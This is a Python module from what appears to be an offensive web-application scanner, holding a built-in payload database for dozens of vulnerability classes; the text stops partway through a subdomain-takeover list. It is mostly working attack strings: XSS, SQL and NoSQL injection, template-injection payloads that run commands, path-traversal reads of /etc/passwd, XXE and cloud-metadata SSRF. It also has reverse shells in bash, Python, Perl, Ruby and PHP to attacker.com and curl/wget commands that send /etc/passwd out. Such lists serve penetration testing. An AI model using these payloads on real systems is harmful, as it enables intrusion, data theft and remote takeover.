#!/usr/bin/env python3
"""
CHOMBEZA - Payload Database Module
UPDATED: Now includes payloads for all 50+ vulnerability types
Created by: archnexus707 (Dickson Massawe)
"""

import json
import os
import base64
import urllib.parse
from typing import Dict, List, Optional

class PayloadDatabase:
    """Central payload database for all vulnerability types"""
    
    def __init__(self, db_path: str = "core/payloads.json"):
        self.db_path = db_path
        self.payloads = self._load_db()
        
    def _load_db(self) -> Dict[str, List[str]]:
        """Load payload database from JSON file or create default"""
        if not os.path.exists(self.db_path):
            default_db = self._create_default_db()
            try:
                os.makedirs(os.path.dirname(self.db_path), exist_ok=True)
                with open(self.db_path, 'w', encoding='utf-8') as f:
                    json.dump(default_db, f, indent=2, ensure_ascii=False)
            except Exception as e:
                print(f"Warning: Could not save payload database: {e}")
            return default_db
        else:
            try:
                with open(self.db_path, 'r', encoding='utf-8') as f:
                    return json.load(f)
            except Exception as e:
                print(f"Warning: Could not load payload database, using defaults: {e}")
                return self._create_default_db()
    
    def _create_default_db(self) -> Dict[str, List[str]]:
        """Create default payload database with all vulnerability types"""
        return {
            # ========== INJECTION ==========
            "xss": [
                # Basic
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)",
                "\"><script>alert(1)</script>",
                "'><script>alert(1)</script>",
                "<svg/onload=alert(1)>",
                "<details/open/ontoggle=alert(1)>",
                "<iframe src=javascript:alert(1)>",
                "<body onload=alert(1)>",
                "<input onfocus=alert(1) autofocus>",
                "<math href=javascript:alert(1)>click</math>",
                "<link rel=import href=javascript:alert(1)>",
                "<video><source onerror=alert(1)>",
                "<audio src=x onerror=alert(1)>",
                "<marquee onstart=alert(1)>",
                "<isindex action=javascript:alert(1) type=image>",
                "<object data=javascript:alert(1)>",
                "<embed src=javascript:alert(1)>",
                
                # Encoded variants
                "<script>eval(atob('YWxlcnQoMSk='))</script>",
                "<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>",
                "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
                "<script>setTimeout('alert(1)',0)</script>",
                "<script>window['al'+'ert'](1)</script>",
                "<script>self['al'+'ert'](1)</script>",
                "<script>top['al'+'ert'](1)</script>",
                "<script>parent['al'+'ert'](1)</script>",
                "<script>frames['al'+'ert'](1)</script>",
                "<script>[].map.constructor('alert(1)')()</script>",
                "<script>[].find.constructor('alert(1)')()</script>",
                "<script>[].filter.constructor('alert(1)')()</script>",
                "<script>[].reduce.constructor('alert(1)')()</script>",
                "<script>[].sort.constructor('alert(1)')()</script>",
                "<script>[]['map']['constructor']('alert(1)')()</script>",
                "<script>Function('alert(1)')()</script>",
                "<script>window.constructor.constructor('alert(1)')()</script>",
                
                # Blind XSS
                "<script src=http://localhost:5000/xss></script>",
                "<img src=http://localhost:5000/xss>",
                "<link rel=stylesheet href=http://localhost:5000/xss>",
                "<iframe src=http://localhost:5000/xss>",
                "<embed src=http://localhost:5000/xss>",
                "<object data=http://localhost:5000/xss>",
                "<script>new Image().src='http://localhost:5000/xss?'+document.cookie</script>",
                "<script>fetch('http://localhost:5000/xss?'+document.cookie)</script>",
                
                # DOM XSS
                "javascript:alert(document.cookie)",
                "javascript:alert(document.domain)",
                "#<img src=x onerror=alert(1)>",
                "\"-alert(1)-",
                "';alert(1);//",
                "'';!--\"<XSS>=&{()}"
            ],
            
            "sqli": [
                # Error-based
                "'",
                "\"",
                "`",
                "' OR '1'='1",
                "\" OR \"1\"=\"1",
                "` OR `1`=`1",
                "1' OR '1'='1",
                "1\" OR \"1\"=\"1",
                "1` OR `1`=`1",
                "' OR 1=1--",
                "\" OR 1=1--",
                "` OR 1=1--",
                "' OR '1'='1'--",
                "\" OR \"1\"=\"1\"--",
                "` OR `1`=`1`--",
                
                # Union-based
                "1' ORDER BY 1--+",
                "1' ORDER BY 2--+",
                "1' ORDER BY 3--+",
                "1' ORDER BY 4--+",
                "1' ORDER BY 5--+",
                "1' UNION SELECT 1--+",
                "1' UNION SELECT 1,2--+",
                "1' UNION SELECT 1,2,3--+",
                "1' UNION SELECT 1,2,3,4--+",
                "1' UNION SELECT 1,2,3,4,5--+",
                "1' UNION SELECT NULL--+",
                "1' UNION SELECT NULL,NULL--+",
                "1' UNION SELECT NULL,NULL,NULL--+",
                
                # Boolean-based blind
                "1' AND '1'='1",
                "1' AND '1'='2",
                "1' AND 1=1--+",
                "1' AND 1=2--+",
                "' AND '1'='1",
                "' AND '1'='2",
                "' AND 1=1--+",
                "' AND 1=2--+",
                
                # Time-based blind
                "1' AND SLEEP(5)--+",
                "1' AND BENCHMARK(5000000,MD5(1))--+",
                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--+",
                "' AND SLEEP(5)--+",
                "' AND BENCHMARK(5000000,MD5(1))--+",
                "'; WAITFOR DELAY '00:00:05'--",
                "'); WAITFOR DELAY '00:00:05'--",
                "'; WAITFOR DELAY '0:0:5'--",
                
                # Out-of-band
                "1' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'.attacker.com\\\\test'))--+",
                "1' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--+",
                "1' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT version()))--+",
                
                # Second-order
                "admin'--",
                "admin' #",
                "admin'/*",
                "' UNION SELECT 1,2,3 INTO OUTFILE '/tmp/test'--+",
                "' UNION SELECT 1,2,3 INTO DUMPFILE '/tmp/test'--+",
                "' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--+",
                "' UNION SELECT 1,@@version,3--+",
                "' UNION SELECT 1,database(),3--+",
                "' UNION SELECT 1,user(),3--+",
                "' UNION SELECT 1,table_name,3 FROM information_schema.tables--+",
                "' UNION SELECT 1,column_name,3 FROM information_schema.columns--+"
            ],
            
            "sqli_blind": [
                # Boolean-based
                "' AND '1'='1",
                "' AND '1'='2",
                "1' AND 1=1--",
                "1' AND 1=2--",
                "' AND 1=1--",
                "' AND 1=2--",
                "1' AND SUBSTRING(version(),1,1)='1'--",
                "1' AND ASCII(SUBSTRING(version(),1,1))>0--",
                "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                
                # Time-based
                "1' AND SLEEP(5)--",
                "1' AND BENCHMARK(5000000,MD5(1))--",
                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' AND SLEEP(5)--",
                "1' OR SLEEP(5)--",
                "' OR SLEEP(5)--",
                "1' WAITFOR DELAY '00:00:05'--",
                "1'); WAITFOR DELAY '00:00:05'--",
                "1')); WAITFOR DELAY '00:00:05'--",
                "1' AND 1=(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND SLEEP(5))--"
            ],
            
            "nosqli": [
                # MongoDB injection
                "'[$ne]=1",
                "\"[$ne]=1",
                "{$ne:1}",
                "{'$ne':1}",
                "{\"$ne\":1}",
                "admin' || '1'=='1",
                "admin' && '1'=='1",
                "';return true;var foo='",
                "';return 1;'",
                "' && this.password.match(/.*/)//",
                "' && this.password && this.password.match(/^a/)//",
                
                # NoSQL operators
                "{\"$gt\":\"\"}",
                "{\"$regex\": \"^\"}",
                "{\"$in\": [\"admin\"]}",
                "{\"$or\": []}",
                "{\"$and\": []}",
                "{\"$where\": \"return true\"}",
                
                # Time-based
                "';sleep(5000);'",
                "{\"$where\": \"sleep(5000)\"}",
                "{\"$eval\": \"sleep(5000)\"}",
                "{\"$function\": \"sleep(5000)\"}"
            ],
            
            "ldapi": [
                # LDAP injection
                "*)(uid=*",
                "*)(|(uid=*",
                "*)(uid=*))(|(uid=*",
                "admin*)(userPassword=*)",
                "admin*))(|(userPassword=*",
                "*)(|(cn=*",
                "*)(uid=*)(|(uid=*",
                "*)(uid=*)(!(uid=*",
                "*)(&(uid=*",
                "admin*)(&(uid=*",
                "admin*)(!(uid=*",
                
                # Advanced LDAP
                "*)(|(userPassword=*",
                "*)(&(userPassword=*",
                "*)(uid=*)(userPassword=*",
                "admin*)(userPassword=*))(|(userPassword=*",
                "admin*)(|(userPassword=*",
                "*)(cn=*))(|(cn=*"
            ],
            
            "xpathi": [
                # XPath injection
                "' or '1'='1",
                "' or ''='",
                "'] | //* | //*['",
                "admin' or '1'='1",
                "admin' or ''='",
                "' or 1=1 or ''='",
                "' or 1=1--",
                "\" or \"1\"=\"1",
                "\" or 1=1 or \"\"=\"",
                "' and count(/*)=1 and ''='",
                "' and count(/*)=2 and ''='",
                "' and substring(name(/*[1]),1,1)='a' and ''='",
                
                # Blind XPath
                "' and 1=1 and ''='",
                "' and 1=2 and ''='",
                "' and string-length(name(/*[1]))=1 and ''='",
                "' and string-length(name(/*[1]))=2 and ''='"
            ],
            
            "ssti": [
                # Basic template injection
                "{{7*7}}",
                "${7*7}",
                "#{7*7}",
                "<%= 7*7 %>",
                "[[7*7]]",
                "${{7*7}}",
                
                # Jinja2
                "{{config}}",
                "{{self.__dict__}}",
                "{{request}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
                "{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"id\").read()')}}",
                "{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}",
                "{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}",
                "{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['os'].popen('id').read()}}",
                
                # Twig
                "{{_self.env.registerUndefinedFilterCallback('exec')}}",
                "{{_self.env.getFilter('id')}}",
                "{{['id']|filter('system')}}",
                
                # Freemarker
                "${7*7}",
                "${7*7}",
                "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
                "${'freemarker.template.utility.Execute'?new()('id')}",
                
                # Velocity
                "#set($x=7*7)$x",
                "#set($e='exec')$e",
                "#set($x='')$x.class.forName('java.lang.Runtime').getRuntime().exec('id')",
                
                # Smarty
                "{$smarty.version}",
                "{php}echo 'id';{/php}",
                "{literal}{/literal}",
                "{system('id')}"
            ],
            
            "lfi": [
                # Basic LFI
                "../../../../etc/passwd",
                "../../../../etc/passwd%00",
                "....//....//....//etc/passwd",
                "..;/..;/..;/etc/passwd",
                "../../../../etc/passwd%00",
                
                # Encoded variants
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                
                # Windows paths
                "../../../../windows/win.ini",
                "....//....//....//windows/win.ini",
                "../../../../windows/system32/drivers/etc/hosts",
                "C:\\windows\\win.ini",
                "file:///c:/windows/win.ini",
                
                # PHP wrappers
                "php://filter/convert.base64-encode/resource=index.php",
                "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
                "php://filter/read=convert.base64-encode/resource=config.php",
                "php://input",
                "expect://id",
                
                # Log poisoning
                "../../../../var/log/apache2/access.log",
                "../../../../var/log/apache2/error.log",
                "../../../../var/log/nginx/access.log",
                "../../../../var/log/nginx/error.log",
                "../../../../var/log/auth.log",
                "../../../../var/log/messages",
                
                # Proc files
                "../../../../proc/self/environ",
                "../../../../proc/self/cmdline",
                "../../../../proc/self/fd/0",
                "../../../../proc/self/fd/1",
                "../../../../proc/self/fd/2",
                "../../../../proc/self/stat",
                "../../../../proc/self/status"
            ],
            
            "rce": [
                # Command injection - Basic
                ";id",
                "|id",
                "`id`",
                "$(id)",
                "${id}",
                "&& id",
                "|| id",
                
                # Command injection - Advanced
                "; ls -la",
                "| ls -la",
                "`ls -la`",
                "$(ls -la)",
                "&& ls -la",
                "|| ls -la",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "`cat /etc/passwd`",
                "$(cat /etc/passwd)",
                
                # Reverse shells
                "nc -e /bin/sh attacker.com 4444",
                "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
                "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
                "perl -e 'use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
                "ruby -rsocket -e 'c=TCPSocket.new(\"attacker.com\",\"4444\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
                "php -r '$sock=fsockopen(\"attacker.com\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                
                # File operations
                "id > /tmp/test",
                "wget --post-file=/etc/passwd http://attacker.com/",
                "curl -X POST -d @/etc/passwd http://attacker.com/",
                "ssh -o ProxyCommand='nc attacker.com 22' user@attacker.com",
                
                # Code injection
                "phpinfo();",
                "eval($_GET[1]);",
                "system('id');",
                "exec('id');",
                "shell_exec('id');",
                "passthru('id');",
                "`id`;",
                "eval('id');",
                "assert('id');",
                "preg_replace('/.*/e', 'system(\"id\")', '');"
            ],
            
            "xxe": [
                # Basic XXE
                """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>""",
                
                """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<foo>&xxe;</foo>""",
                
                # XXE with parameter entities
                """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
%xxe;
]>""",
                
                # XXE for SSRF
                """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>""",
                
                """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://localhost:8080/admin">
]>
<foo>&xxe;</foo>""",
                
                """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://internal-server.local">
]>
<foo>&xxe;</foo>""",
                
                # XXE for DoS (Billion Laughs)
                """<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>""",
                
                # XXE with external DTD
                """<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd">
<foo>&xxe;</foo>"""
            ],
            
            "ssrf": [
                # Basic SSRF
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/user-data/",
                "http://169.254.169.254/metadata/v1/maintenance",
                "http://169.254.169.254/2018-09-24/meta-data/",
                "http://metadata.google.internal/",
                "http://100.100.100.200/latest/meta-data/",
                
                # Localhost
                "http://localhost/admin",
                "http://127.0.0.1:8080",
                "http://127.0.0.1:22",
                "http://[::1]:22",
                "http://0.0.0.0:80",
                "http://0:80",
                
                # Internal networks
                "http://internal-server.local",
                "http://internal.target.com",
                "http://10.0.0.1/admin",
                "http://172.16.0.1:8080",
                "http://192.168.1.1",
                
                # Protocol smuggling
                "gopher://127.0.0.1:22/_SSH-2.0-OpenSSH_7.6p1",
                "gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0AHost:%20localhost%0A%0A",
                "dict://127.0.0.1:11211/",
                "file:///etc/passwd",
                "ftp://ftp.target.com",
                "tftp://127.0.0.1:69/test",
                "ldap://127.0.0.1:389/",
                "smb://127.0.0.1:445/",
                
                # Blind SSRF
                "http://attacker.com/ssrf",
                "https://attacker.com/ssrf",
                "http://attacker.com:8000/ssrf",
                "gopher://attacker.com:8080/_SSRF"
            ],
            
            # ========== CONFIGURATION ==========
            "jwt": [
                # None algorithm
                "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
                "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
                "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
                
                # Weak secret
                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
                
                # Kid injection
                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9ldGMvcGFzc3dkIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.abcdef123456",
                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjAwMDAifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.abcdef123456",
                
                # JKU injection
                "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly9hdHRhY2tlci5jb20va2V5Lmpzb24ifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.abcdef123456",
                
                # Algorithm confusion
                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
                
                # Missing signature
                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ."
            ],
            
            "cors": [
                # Test origins
                "Origin: https://evil.com",
                "Origin: null",
                "Origin: http://sub.target.com.evil.com",
                "Origin: https://target.com.evil.com",
                "Origin: http://localhost",
                "Origin: http://127.0.0.1",
                "Origin: file://",
                "Origin: http://192.168.1.1",
                
                # Wildcard testing
                "Origin: *",
                "Origin: https://*",
                "Origin: http://*.target.com",
                
                # Preflight testing
                "Access-Control-Request-Method: PUT",
                "Access-Control-Request-Method: DELETE",
                "Access-Control-Request-Method: TRACE",
                "Access-Control-Request-Headers: X-Custom-Header"
            ],
            
            "csp": [
                # CSP directives
                "default-src 'none'",
                "default-src 'self'",
                "script-src 'unsafe-inline'",
                "script-src 'unsafe-eval'",
                "script-src http://evil.com",
                "style-src 'unsafe-inline'",
                "img-src *",
                "connect-src *",
                "frame-src *",
                "object-src *",
                "media-src *",
                "font-src *",
                
                # CSP bypass attempts
                "script-src 'unsafe-inline' 'unsafe-eval' https: http:",
                "script-src 'nonce-1234'",
                "script-src 'sha256-abc123'"
            ],
            
            "http_smuggling": [
                # CL.TE
                "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
                
                # TE.CL
                "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n",
                
                # TE.TE
                "POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: xchunked\r\n\r\n0\r\n\r\n",
                
                # CL.CL
                "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nContent-Length: 5\r\n\r\n12345a",
                
                # Header folding
                "POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\n Transfer-Encoding: chunked\r\n\r\n0\r\n\r\n"
            ],
            
            "web_cache": [
                # Cache poisoning headers
                "X-Forwarded-Host: evil.com",
                "X-Forwarded-Scheme: http",
                "X-Original-URL: /admin",
                "X-Rewrite-URL: /admin",
                "X-HTTP-Method-Override: POST",
                "X-HTTP-Method: PUT",
                "X-Method-Override: DELETE",
                
                # Cache deception
                "/test.css",
                "/test.jpg",
                "/test.js",
                "/test.css?",
                "/test.css#",
                "/test.css/",
                
                # Unkeyed headers
                "X-Forwarded-For: 127.0.0.1",
                "X-Real-IP: 127.0.0.1",
                "X-Originating-IP: 127.0.0.1",
                "Client-IP: 127.0.0.1",
                "X-Remote-IP: 127.0.0.1",
                "X-Remote-Addr: 127.0.0.1"
            ],
            
            "open_redirect": [
                "//evil.com",
                "https://evil.com",
                "http://evil.com",
                "//evil.com/",
                "/\\evil.com",
                "/\\/evil.com",
                "https://evil.com?",
                "https://evil.com#",
                "javascript:alert(1)",
                "data:text/html,<script>alert(1)</script>",
                "https:evil.com",
                "http:evil.com",
                "//google.com@evil.com",
                "https://evil.com.google.com",
                "https://evil.com\\google.com",
                "https://evil.com/google.com",
                "/redirect?url=https://evil.com",
                "/redirect?next=https://evil.com",
                "/redirect?to=https://evil.com"
            ],
            
            "crlf": [
                "%0d%0aSet-Cookie: session=hacked",
                "%0d%0aLocation: https://evil.com",
                "%0d%0aX-Test: injected",
                "%0d%0a%0d%0a<script>alert(1)</script>",
                "%0aSet-Cookie: session=hacked",
                "%0aLocation: https://evil.com",
                "%0aX-Test: injected",
                "%0a%0a<script>alert(1)</script>",
                "\r\nSet-Cookie: session=hacked",
                "\r\nLocation: https://evil.com",
                "\r\nX-Test: injected",
                "\r\n\r\n<script>alert(1)</script>"
            ],
            
            # ========== ACCESS CONTROL ==========
            "idor": [
                # Numeric IDs
                "user_id=1",
                "user_id=2",
                "user_id=3",
                "user_id=1000",
                "id=1",
                "id=2",
                "id=3",
                "account=1",
                "account=2",
                "account=3",
                "profile=1",
                "profile=2",
                "profile=3",
                
                # UUIDs
                "user_id=00000000-0000-0000-0000-000000000001",
                "user_id=00000000-0000-0000-0000-000000000002",
                "user_id=00000000-0000-0000-0000-000000000003",
                
                # Hashed/encoded IDs
                "user_id=MQ==",  # base64 of "1"
                "user_id=Mw==",  # base64 of "3"
                "user_id=10",     # hex of "16"
                "user_id=1f",     # hex of "31"
                
                # Special values
                "user_id=0",
                "user_id=-1",
                "user_id=9999999",
                "user_id=admin",
                "user_id=root",
                "user_id=null",
                "user_id=undefined"
            ],
            
            "privilege_escalation": [
                # Horizontal
                "role=user",
                "role=admin",
                "role=administrator",
                "group=users",
                "group=admins",
                "level=1",
                "level=2",
                "level=3",
                "access=read",
                "access=write",
                "access=admin",
                
                # Vertical
                "is_admin=true",
                "is_admin=1",
                "is_admin=yes",
                "admin=true",
                "admin=1",
                "admin=yes",
                "administrator=true",
                "privilege=admin",
                "permissions=*",
                "permissions=all"
            ],
            
            "broken_access": [
                # Direct access attempts
                "/admin",
                "/administrator",
                "/admin/",
                "/admin.php",
                "/admin.jsp",
                "/admin.asp",
                "/admin.aspx",
                "/admin/index.html",
                "/admin/login",
                "/admin/dashboard",
                
                # Bypass attempts
                "/../admin",
                "/;admin",
                "/./admin",
                "/admin/*",
                "/admin/..;/",
                "/admin/..\\",
                "/admin/..%2f",
                "/admin/..%5c"
            ],
            
            "mass_assignment": [
                # JSON payloads
                '{"admin":true}',
                '{"is_admin":true}',
                '{"role":"admin"}',
                '{"privilege":"admin"}',
                '{"access_level":999}',
                '{"permissions":["*"]}',
                '{"user":{"admin":true}}',
                '{"user[admin]":true}',
                
                # Form parameters
                "admin=true",
                "is_admin=true",
                "role=admin",
                "privilege=admin",
                "access_level=999",
                "permissions[]=*",
                "user[admin]=true",
                
                # Nested attributes
                "user[role]=admin",
                "account[admin]=true",
                "profile[access_level]=999"
            ],
            
            # ========== API & MODERN ==========
            "graphql": [
                # Introspection
                """query { __schema { types { name } } }""",
                """query { __schema { types { name fields { name type { name kind } } } } }""",
                """query { __schema { queryType { fields { name } } } }""",
                """query { __schema { mutationType { fields { name } } } }""",
                
                # Field exposure
                """query { user(id: 1) { password } }""",
                """query { user(id: 1) { email } }""",
                """query { user(id: 1) { token } }""",
                """query { user(id: 1) { apiKey } }""",
                """query { user(id: 1) { secret } }""",
                
                # Mutations
                """mutation { deleteUser(id: 1) }""",
                """mutation { updateUser(id: 1, role: "admin") }""",
                """mutation { createUser(input: {role: "admin"}) }""",
                
                # Deep query (DoS)
                """query { user(id: 1) { posts { comments { user { posts { comments { user { name } } } } } } } }""",
                
                # Batching
                """query { u1: user(id: 1) { name } u2: user(id: 2) { name } }""",
                
                # Alias confusion
                """query { admin: user(id: 1) { password } user: user(id: 2) { password } }""",
                
                # Fragment
                """fragment UserData on User { id name email password } query { user(id: 1) { ...UserData } }"""
            ],
            
            "websocket": [
                # Connection strings
                "ws://localhost:8080",
                "wss://target.com/internal",
                "ws://target.com:8080/ws",
                "wss://target.com/ws",
                
                # Message injection
                '{"action": "exec", "cmd": "id"}',
                '{"type": "command", "command": "ls"}',
                '{"event": "message", "data": "<script>alert(1)</script>"}',
                '{"method": "subscribe", "channel": "admin"}',
                '{"operation": "delete", "id": 1}',
                
                # Protocol attacks
                "GET /ws HTTP/1.1\r\nHost: target.com\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\r\nSec-WebSocket-Version: 13\r\n\r\n",
                
                # XSS in WebSocket
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>"
            ],
            
            "api_fuzzing": [
                # Path traversal
                "api/v1/users/1",
                "api/v2/admin",
                "api/internal",
                "api/.git/HEAD",
                "api/..%2f..%2fetc%2fpasswd",
                "api/..;/..;/admin",
                
                # Version discovery
                "api/v1",
                "api/v2",
                "api/v3",
                "api/v1.1",
                "api/v2.0",
                "api/1",
                "api/2",
                "api/3",
                
                # HTTP methods
                "GET",
                "POST",
                "PUT",
                "DELETE",
                "PATCH",
                "HEAD",
                "OPTIONS",
                "TRACE",
                "CONNECT",
                
                # Common endpoints
                "api/users",
                "api/admin",
                "api/login",
                "api/register",
                "api/upload",
                "api/download",
                "api/export",
                "api/import",
                "api/backup",
                "api/config",
                "api/settings",
                "api/debug",
                "api/test",
                "api/health",
                "api/metrics"
            ],
            
            "grpc": [
                # gRPC reflection
                "grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo",
                
                # Common services
                "helloworld.Greeter/SayHello",
                "grpc.health.v1.Health/Check",
                "grpc.health.v1.Health/Watch",
                
                # Method enumeration
                "/package.Service/Method",
                "/package.Service/",
                "/package./",
                "//"
            ],
            
            "serverless": [
                # AWS Lambda
                "https://lambda-url.us-east-1.amazonaws.com/",
                "https://api-id.execute-api.us-east-1.amazonaws.com/dev/",
                "https://api-id.execute-api.us-east-1.amazonaws.com/prod/",
                "https://api-id.execute-api.us-east-1.amazonaws.com/stage/",
                
                # Azure Functions
                "https://app.azurewebsites.net/api/function",
                "https://app.azurewebsites.net/admin/functions",
                "https://app.scm.azurewebsites.net/api/functions",
                
                # Google Cloud Functions
                "https://region-project.cloudfunctions.net/function",
                "https://region-project.cloudfunctions.net/function?key=value",
                
                # Environment variables
                "/proc/self/environ",
                "/proc/self/cmdline",
                "/proc/self/environ?AWSSECRET",
                "/proc/self/environ?AZURE_KEY"
            ],
            
            # ========== INFRASTRUCTURE ==========
            "subdomain_takeover": [
                # AWS S3
                "CNAME evil.com",
                "CNAME bucket.s3.amazonaws.com",
                "CNAME bucket.s3-website-us-east-1.amazonaws.com",
                "CNAME bucket.s3-website.eu-west-2.amazonaws.com",
                
                # Azure
                "CNAME app.azurewebsites.net",
                "CNAME app.scm.azurewebsites.net",
                "CNAME app.cloudapp.net",
                "CNAME app.trafficmanager.net",
                
                # GitHub
                "CNAME username.github.io",
                "CNAME organization.github.io",
                "CNAME pages.github.com",
                
                # Heroku
                "CNAME app.herokuapp.com",
                "CNAME app.herokussl.com",
                
                # Shopify
                "CNAME shops.myshopify.com",
                "CNAME shopify.com",
                
                # WordPress
                "CNAME wordpress.com",
                "CNAME wpengine.com",
                
                # Other
                "CNAME cloudfront.net",
                "CNAME elasticbeanstalk.com",
                "CNAME fastly.net",
                "CNAME ghost.io",
                "CNAME hatena.com",
                "CNAME helpjuice.com",
                "CNAME helpscout.net",
                "CNAME intercom.com",
                "CNAME kampyle.com",
                "CNAME launchrock.com",
                "CNAME lighthouseapp.com",
                "CNAME odoo.com",
                "CNAME pantheon.io",
